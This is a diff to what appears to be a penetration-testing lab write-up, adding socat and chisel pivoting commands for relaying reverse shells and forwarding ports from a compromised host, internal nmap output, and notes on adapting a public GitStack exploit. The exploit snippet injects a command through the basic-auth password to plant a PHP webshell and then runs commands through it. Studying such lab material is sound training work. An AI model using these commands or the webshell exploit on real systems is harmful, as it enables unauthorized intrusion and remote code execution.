@@ -830,6 +830,18 @@ kali@kali:~$ jobs
 [1]+  Exit 143                socat tcp-l:8001 tcp-l:8000,fork,reuseaddr
 ```
 
+### Examples
+
+- Attacking IP 172.16.0.200
+- relay a reverse shell to TCP port 443 on Attacking Machine
+
+`./socat tcp-l:8000 tcp:172.16.0.200:443`
+
+- Forward TCP port 2222 on a compromised server, to 172.16.0.100:22 (easy method)
+
+`./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &`
+
+
 </details>
 
 ## 10. Pivoting - Chisel
@@ -1002,6 +1014,30 @@ Connect to 172.16.0.5:8000 (compromised host running chisel), forwarding our loc
 
 > ./chisel client 172.16.0.100:3306 R:socks:172.16.0.200:1337 &
 
+### Examples
+
+- Use port 4242 for the listener and do not background the process.
+
+`./chisel server -p 4242 --reverse`
+
+- Connect back to this server with a SOCKS proxy from a compromised host
+- Your IP 172.16.0.200 
+- Backgrounding the process
+
+`./chisel client 172.16.0.200:4242 R:socks &`
+
+- Forward 172.16.0.100:3306 to your own port 33060 
+- Using a chisel remote port forward 
+- Your IP 172.16.0.200, listening port is 1337
+- Background this process
+
+`./chisel client 172.16.0.200:1337 33060:172.16.0.100:3306 &`
+
+- Chisel server running on 172.16.0.5:4444
+- Create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
+
+`./chisel client 172.16.0.5:4444 8000:172.16.0.10:80` 
+
 </details>
 
 ## 11. Pivoting - sshuttle
@@ -1151,6 +1187,26 @@ MAC Address: 02:AD:06:35:A5:CB (Unknown)
 Nmap done: 1 IP address (1 host up) scanned in 574.74 seconds
 ```
 
+Scanning first 15000 port
+```
+[root@prod-serv tmp]# ./nmap-Neozer0 -p1-15000 10.200.85.150
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-16 23:49 BST
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00083s latency).
+Not shown: 14997 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+MAC Address: 02:4C:02:6B:0D:57 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 280.32 seconds
+```
+
 </details>
 
 ## 14. Git Server - Pivoting
@@ -1160,6 +1216,8 @@ Nmap done: 1 IP address (1 host up) scanned in 574.74 seconds
 
 Port 80 is interesting in 10.200.81.150.
 We use sshuttle to ssh tunnel to 150 through 200 from the attacking machine
+
+### ssh tunnel
 
 Attacking box - this runs in the background with `-fN`
 ```
@@ -1173,6 +1231,10 @@ We navigate to `localhost:8000` and see an error page that tells us various acce
 We navigate to `localhost:8000/gitstack` and see a log in page - default creds do not work
 
 ![gitstack](gitstack.png)
+
+### sshuttle
+
+TODO
 
 Use searchsploit on gitstack
 ```
@@ -1190,7 +1252,7 @@ Shellcodes: No Result
 
 </details>
 
-## 15. Git Server - Code Review
+## 15. Git Server - Code (exploit) Review
 
 <details>
   <summary>---</summary>
@@ -1215,7 +1277,40 @@ or
 sed -i 's/\r//' ./EDBID.py
 ```
 
+Check what version python this would run on with `print` statements (`print()` for python3 and `print ""` for python2)
 
+1. Add shebang `#!/usr/bin/python2` so we can run `./43777.py`; or 
+2. Run with python2 `python2 43777.py` without adding shebang to the file
 
+Change the ip address to `localhost:8000` (ssh port forward method)
+
+```python
+ip = 'localhost:8000'
+
+# What command you want to execute
+command = "whoami"
+
+repository = 'rce'
+username = 'rce'
+password = 'rce'
+csrf_token = 'token'
+```
+
+The command `whoami` will be run on execution
+
+Last six lines of the exploit:
+```python
+print "[+] Create backdoor in PHP"
+r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
+print r.text.encode(sys.stdout.encoding, errors='replace')
+
+print "[+] Execute command"
+r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : command})
+print r.text.encode(sys.stdout.encoding, errors='replace')
+```
+
+These create PHP webshell `<?php system($_POST['a']); ?>` and echo it into `exploit.php` under webroot.
+
+This can be accessed by posting a command to `/web/exploit.php`
 
 </details>
